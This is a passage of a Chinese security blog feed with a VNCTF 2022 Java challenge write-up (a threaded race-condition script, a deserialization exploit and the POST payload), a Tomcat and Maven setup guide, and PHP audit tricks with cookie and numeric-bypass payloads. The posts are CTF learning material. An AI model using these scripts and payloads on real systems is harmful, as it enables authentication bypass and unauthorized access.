class="hljs-number">8080</span>-exec-<span class="hljs-number">7</span>  Count:<span class="hljs-number">5029</span><br><span class="hljs-attribute">http</span>-nio-<span class="hljs-number">8080</span>-exec-<span class="hljs-number">3</span>  Count:<span class="hljs-number">5030</span><br><span class="hljs-attribute">http</span>-nio-<span class="hljs-number">8080</span>-exec-<span class="hljs-number">6</span>  Count:<span class="hljs-number">5032</span><br><span class="hljs-attribute">http</span>-nio-<span class="hljs-number">8080</span>-exec-<span class="hljs-number">8</span>  Count:<span class="hljs-number">5032</span><br><span class="hljs-attribute">http</span>-nio-<span class="hljs-number">8080</span>-exec-<span class="hljs-number">5</span>  Count:<span class="hljs-number">5033</span><br></code></pre></td></tr></table></figure><p>可以 发现 5 6 行输出了同一个结果</p><p>然后来看项目中的问题代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(name = &quot;HelloServlet&quot;, urlPatterns = &#123;&quot;/evi1&quot;&#125;)</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>    String reqName = req.getParameter(<span class="hljs-string">&quot;name&quot;</span>); <span class="hljs-comment">//name传参</span><br>    <span class="hljs-keyword">if</span> (reqName != <span class="hljs-keyword">null</span>)<br>      <span class="hljs-keyword">this</span>.name = reqName; <br>    <span class="hljs-keyword">if</span> (Secr3t.check(<span class="hljs-keyword">this</span>.name)) &#123; <span class="hljs-comment">//关键点Part1 两个check方法校验 传入 Name===&quot;vnctf2022&quot;</span><br>      Response(resp, <span class="hljs-string">&quot;no vnctf2022!&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125; <br>    <span class="hljs-keyword">if</span> (Secr3t.check(<span class="hljs-keyword">this</span>.name))<br>      Response(resp, <span class="hljs-string">&quot;The Key is &quot;</span> + Secr3t.getKey()); <br>  &#125;<br></code></pre></td></tr></table></figure><p>根据上面的问题，可以构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> threading<br>BASE_URL=<span class="hljs-string">&quot;http://9ebb171c-d788-4f69-a96a-984803b54f7e.node4.buuoj.cn:81/evi1?name=&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">access1</span>(<span class="hljs-params">parameter</span>):</span><br>    url=BASE_URL+parameter<br>    res=requests.get(url=url)<br>    res.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>    <span class="hljs-built_in">print</span>(res.text)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&quot;The Key is&quot;</span>)!=-<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        sys.exit(<span class="hljs-number">1</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">access2</span>(<span class="hljs-params">parameter</span>):</span><br>    url=BASE_URL+parameter<br>    res=requests.get(url=url)<br>    res.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>    <span class="hljs-built_in">print</span>(res.text)<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&quot;The Key is&quot;</span>)!=-<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        sys.exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>        t1 = threading.Thread(target=access1,args=(<span class="hljs-string">&quot;vnctf2022&quot;</span>,))<br>        t2 = threading.Thread(target=access2,args=(<span class="hljs-string">&quot;111&quot;</span>,))<br>        t1.start()<br>        t2.start()<br>        t1.join()<br>        t2.join()<br><span class="hljs-comment">#output:The Key is kTuc9HA9yguVc5Lo5qPhkE1nCU2ERkPT</span><br>3JwGiOqNIYbYhnnd80eH0j36DKbbGx7G<br></code></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ul><li><p>加上对象锁synchronized</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>)&#123;<br>    <span class="hljs-comment">/*expression*/</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用局部变量而不是成员变量</p></li></ul><h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><p>先来看看题目的要求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> String name = <span class="hljs-string">&quot;m4n_q1u_666&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> String age = <span class="hljs-string">&quot;666&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> String height = <span class="hljs-string">&quot;180&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>    String key = req.getParameter(<span class="hljs-string">&quot;key&quot;</span>);<br>    String text = req.getParameter(<span class="hljs-string">&quot;base64&quot;</span>);<span class="hljs-comment">//关键点Part2</span><br>    <span class="hljs-keyword">if</span> (Secr3t.getKey().equals(key) &amp;&amp; text != <span class="hljs-keyword">null</span>) &#123;<br>        <br>        Base64.Decoder decoder = Base64.getDecoder();<span class="hljs-comment">//解密字符串</span><br>      <span class="hljs-keyword">byte</span>[] textByte = decoder.decode(text);<br>        User u = (User)SerAndDe.deserialize(textByte); <span class="hljs-comment">//反序列化 传入base64参数</span><br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.user.equals(u))<br>        Response(resp, <span class="hljs-string">&quot;Deserialize…… Flag is &quot;</span> + Secr3t.getFlag().toString()); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      Response(resp, <span class="hljs-string">&quot;KeyError&quot;</span>);<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>不难看出 只要 传入的序列化对象 解密内容 和上面三个属性序列化结果一样就会执行getFlag</p><p>然而在User类定义的地方 存在这样的一个关键字 <code>transient</code> 这意味着这个属性将不被序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> entity;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br><span class="hljs-keyword">private</span> String name;  <br><span class="hljs-keyword">private</span> String age;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> String height;<br> <span class="hljs-comment">//transient:游离的，不参与序列化</span><br></code></pre></td></tr></table></figure><p>对于这个情况只需要补充一个 <code>writeobject</code> 即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> java.io.IOException</span>&#123;<br>      s.defaultWriteObject();<br><span class="hljs-comment">//强制序列化name</span><br>      s.writeObject(<span class="hljs-keyword">this</span>.height);<br>  &#125;<br></code></pre></td></tr></table></figure><p>最后exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> entity.User;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;m4n_q1u_666&quot;</span>,<span class="hljs-string">&quot;666&quot;</span>,<span class="hljs-string">&quot;180&quot;</span>);<br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(user);<br>        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        String result = Base64.getEncoder().encodeToString(bytes);<br>        System.out.println(result);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>http</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">http://9ebb171c-d788-4f69-a96a-984803b54f7e.node4.buuoj.cn:81/evi1</span> <span class="hljs-meta">HTTP/1.1</span><br>...<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="apache"><span class="hljs-attribute">key</span>=kTuc<span class="hljs-number">9</span>HA<span class="hljs-number">9</span>yguVc<span class="hljs-number">5</span>Lo<span class="hljs-number">5</span>qPhkE<span class="hljs-number">1</span>nCU<span class="hljs-number">2</span>ERkPT&amp;base<span class="hljs-number">64</span>=rO<span class="hljs-number">0</span>ABXNyAAtlbnRpdHkuVXNlcm<span class="hljs-number">1</span>aqowD<span class="hljs-number">0</span>DcIAwACTAADYWdldAASTGphdmEvbGFuZy<span class="hljs-number">9</span>TdHJpbmc<span class="hljs-number">7</span>TAAEbmFtZXEAfgABeHB<span class="hljs-number">0</span>AAM<span class="hljs-number">2</span>NjZ<span class="hljs-number">0</span>AAttNG<span class="hljs-number">5</span>fcTF<span class="hljs-number">1</span>XzY<span class="hljs-number">2</span>NnQAAzE<span class="hljs-number">4</span>MHg=</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一个Java-Web搭建经历</title>
    <link href="/2022/03/12/%E8%AE%B0%E4%B8%80%E4%B8%AAJava-web%E6%90%AD%E5%BB%BA%E7%BB%8F%E5%8E%86/"/>
    <url>/2022/03/12/%E8%AE%B0%E4%B8%80%E4%B8%AAJava-web%E6%90%AD%E5%BB%BA%E7%BB%8F%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>系统：Windows 10</p><p>JDK版本：11</p></blockquote><p>Tomcat 负责提供Java web服务，是一个Servlet容器，只做动态代码解析。</p><p>Maven 项目构建管理工具，Maven的核心思想：约定大于配置。</p><h2 id="Tomcat配置"><a href="#Tomcat配置" class="headerlink" title="Tomcat配置"></a>Tomcat配置</h2><p>环境变量中添加</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs taggerscript">CLASS_PATH.;<span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\l</span>ib;<span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\l</span>ib<span class="hljs-symbol">\t</span>ools.jar<br>JAVA_HOMED:<span class="hljs-symbol">\E</span>nviro<span class="hljs-symbol">\j</span>dk11\<br></code></pre></td></tr></table></figure><p>在 <code>apache-tomcat\conf\</code> 下的 <code>server.xml</code> 中可以修改你的站点名称，运行端口，不过多赘述</p><p>运行Tomcat需要双击 <code>apache-tomcat\bin\</code> 下的 <code>startup.bat</code> </p><p>我做的几点修改：</p><ul><li>修改文件内的环境变量</li></ul><p>作用文件：<code>apache-tomcat\bin\startup.bat</code> 和 <code>apache-tomcat\bin\setclasspath.bat</code></p><p>添加 两个局部变量。因为 jdk版本大于 11 之后，存在内置的 JRE 所以这里 JAVA_HOME 和 JRE_HOME 保持一致即可</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic">set JAVA_HOME=D:\Enviro\jdk11\<br>set JRE_HOME=D:\Enviro\jdk11\<br></code></pre></td></tr></table></figure><ul><li>添加Pause</li></ul><p>作用文件：<code>apache-tomcat\bin\startup.bat</code> 文件结尾添加暂停，防止闪退。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">pause<br></code></pre></td></tr></table></figure><ul><li>防止输出日志乱码</li></ul><p>修改 <code>apache-tomcat\conf\server.xml</code> 修改</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122232020.png" alt="image-20220312223249908"></p><p>然后修改输出日志的编码格式</p><p>修改 <code>\apache-tomcat\conf\logging.properties</code> </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122238099.png" alt="image-20220312223838049"></p><center>完成上面操作应有的结果</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122243012.png" alt="image-20220312224301903"></p><h2 id="IDEA配置项目"><a href="#IDEA配置项目" class="headerlink" title="IDEA配置项目"></a>IDEA配置项目</h2><p>新建项目</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203140938217.png" alt="image-20220314093803073"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203140938042.png" alt="image-20220314093835989"></p><p>​    <img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203140951737.png" alt="image-20220314095135681"></p><center>最终成果</center><h2 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h2><p>在环境变量中添加</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">M2 HOME D:<span class="hljs-symbol">\E</span>nviro<span class="hljs-symbol">\a</span>pache-maven-3.8.4<span class="hljs-symbol">\b</span>in<br>MAVEN HOME D:<span class="hljs-symbol">\E</span>nviro<span class="hljs-symbol">\a</span>pache-maven-3.8.4\<br>在系统的path中配置 <span class="hljs-variable">%MAVEN_HOME%</span><span class="hljs-symbol">\b</span>in <br></code></pre></td></tr></table></figure><p>然后修改 <code>apache-maven\conf\settings.xml</code> 添加，需完整去除原先默认镜像(mirrors)配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirrors</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>nexus-aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*,!jeecg,!jeecg-snapshots<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Nexus aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirrors</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后添加本地仓库位置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>D:\Enviro\apache-maven-3.8.4\mavenrepo<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122247130.png" alt="image-20220312224759077"></p><h2 id="IDEA配置项目-1"><a href="#IDEA配置项目-1" class="headerlink" title="IDEA配置项目"></a>IDEA配置项目</h2><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122248695.png" alt="image-20220312224842633" style="zoom:80%;" /><center>选择模板创建项目</center><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122250770.png" alt="image-20220312225035706" style="zoom:80%;" /><center>选择工程名称</center><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122251278.png" alt="image-20220312225117218" style="zoom:80%;" /><center>设置Maven选项</center><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122252175.png" alt="image-20220312225253093" style="zoom:80%;" /><center>这里添加一个配置</center><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203122253622.png" alt="image-20220312225305742" style="zoom:80%;" /><center>配置tomcat运行选项</center>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP Audits and Tricks</title>
    <link href="/2022/03/06/PHP-Audits-and-Tricks/"/>
    <url>/2022/03/06/PHP-Audits-and-Tricks/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="PHP-5-4-md5-哈希缺陷"><a href="#PHP-5-4-md5-哈希缺陷" class="headerlink" title="PHP 5.4 md5 哈希缺陷"></a>PHP 5.4 md5 哈希缺陷</h2><p>Refer：<a href="http://www.sektioneins.de/blog/15-08-03-php_challenge_2015_solution.html">http://www.sektioneins.de/blog/15-08-03-php_challenge_2015_solution.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$users</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;0:9b5c3d2b64b8f74e56edec71462bd97a&quot;</span> ,<br>        <span class="hljs-string">&quot;1:4eb5fb1501102508a86971773849d266&quot;</span>,<br>        <span class="hljs-string">&quot;2:facabd94d57fc9f1e655ef9ce891e86e&quot;</span>,<br>        <span class="hljs-string">&quot;3:ce3924f011fe323df3a6a95222b0c909&quot;</span>,<br>        <span class="hljs-string">&quot;4:7f6618422e6a7ca2e939bd83abde402c&quot;</span>,<br>        <span class="hljs-string">&quot;5:06e2b745f3124f7d670f78eabaa94809&quot;</span>,<br>        <span class="hljs-string">&quot;6:8e39a6e40900bb0824a8e150c0d0d59f&quot;</span>,<br>        <span class="hljs-string">&quot;7:d035e1a80bbb377ce1edce42728849f2&quot;</span>,<br>        <span class="hljs-string">&quot;8:0927d64a71a9d0078c274fc5f4f10821&quot;</span>,<br>        <span class="hljs-string">&quot;9:e2e23d64a642ee82c7a270c6c76df142&quot;</span>,<br>        <span class="hljs-string">&quot;10:70298593dd7ada576aff61b6750b9118&quot;</span><br>);<br><span class="hljs-variable">$valid_user</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$input</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$input</span>[<span class="hljs-number">1</span>] = md5(<span class="hljs-variable">$input</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$users</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>)<br>&#123;<br>        <span class="hljs-variable">$user</span> = explode(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-variable">$user</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$input</span> === <span class="hljs-variable">$user</span>) &#123;<br>                <span class="hljs-variable">$uid</span> = <span class="hljs-variable">$input</span>[<span class="hljs-number">0</span>] + <span class="hljs-number">0</span>;<br>                <span class="hljs-variable">$valid_user</span> = <span class="hljs-literal">true</span>;<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$valid_user</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not a valid user\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$uid</span> == <span class="hljs-number">0</span>) &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello Admin How can I serve you today?\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;SECRETS ....\n&quot;</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome back user\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通读代码，目标是让代码运行到line 32的位置，那么我们需满足</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span> ($uid == <span class="hljs-number">0</span>) &amp;&amp; $valid_user=<span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>可以看到这里将提交的 user md5(passwd) 和 上面的数组内容相比 如果相同 那么可以通关</p><p>经过解密 得到  user 5 对应的密码 hund</p><p>虽然对uid的比较是弱比较 但是 显然 0c这种方式仍然不可行，所以一定是其他形式的原因使我们得以以user 0的身份登入</p><p>先拟定一个payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">Cookie:user[0]=5;user[1]=hund;<br></code></pre></td></tr></table></figure><p>这里存在一个 哈希的缺陷，具体原因参看 Refer的文章</p><p>通过文章得知 <code>user[4294967296]=5</code> &#x3D;&#x3D; <code>user[0]=5</code></p><p>因为构建payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">Cookie:user[4294967296]=5;user[1]=hund;<br></code></pre></td></tr></table></figure><h2 id="PHP-科学计数法绕过数字比较"><a href="#PHP-科学计数法绕过数字比较" class="headerlink" title="PHP 科学计数法绕过数字比较"></a>PHP 科学计数法绕过数字比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;xxxx&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]))&#123; <br>        <span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]))&#123; <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;The time must be number.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>] &lt; <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">30</span> * <span class="hljs-number">2</span>)&#123; <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;This time is too short.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>] &gt; <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">30</span> * <span class="hljs-number">3</span>)&#123; <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;This time is too long.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span>&#123; <br>                sleep((<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]); <br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br>        &#125; <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php接受科学技术法传入的数字 由此 这里可以构建</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/url/</span><span class="hljs-string">?t</span>ime=<span class="hljs-number">6e6</span><br><span class="hljs-string">?t</span>ime=<span class="hljs-number">0x6F1A00</span><br></code></pre></td></tr></table></figure><h2 id="PHP-错误使用addslashes导致代码注入"><a href="#PHP-错误使用addslashes导致代码注入" class="headerlink" title="PHP 错误使用addslashes导致代码注入"></a>PHP 错误使用addslashes导致代码注入</h2><figure 